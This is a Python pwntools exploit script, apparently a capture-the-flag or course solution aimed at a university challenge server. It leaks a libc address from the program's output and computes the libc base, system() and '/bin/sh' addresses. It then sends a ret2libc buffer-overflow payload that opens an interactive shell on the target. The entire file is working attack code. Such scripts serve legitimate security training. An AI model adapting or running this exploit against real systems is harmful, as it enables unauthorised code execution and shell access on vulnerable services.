#!/usr/bin/env python3

from pwn import *

exe = ELF("./bin_patched")
libc = ELF("libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10152)

    return r


def main():
    r = conn()
    r.send(b"A")
    staticBaseLibc = 0xf7e1e000
    addressLeaked = 0xf7fced00
    offsetBinSh = libc.search(b"/bin/sh").__next__()
    print(hex(offsetBinSh))

    offsetSystemLibc = libc.symbols["system"]
    print(hex(offsetSystemLibc))

    offsetToBase = addressLeaked - staticBaseLibc
    print("offset to Base libc " + hex(offsetToBase))

    r.recvuntil(b"buffer: A")
    output = r.recvuntil(b"\n")[:-1]
    print(output)
    output = b"\x00" + output
    aslrLeaked = u32(output)
    print("leaked address : " + hex(aslrLeaked))

    baseLibc = aslrLeaked - offsetToBase
    print("Leaked libc base : " + hex(baseLibc))

    offsetToRet = 0x1c

    sysLibc = baseLibc + offsetSystemLibc
    binSh = baseLibc + offsetBinSh
    print("LEAKED SYSTEM FUNCTION " + hex(sysLibc))
    print("LEAKED BINSH FUNCTION " + hex(binSh))

    r.send((b"\x00"*offsetToRet + p32(sysLibc) + b"A"*4 + p32(binSh)).ljust(0x40, b"\x00"))


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
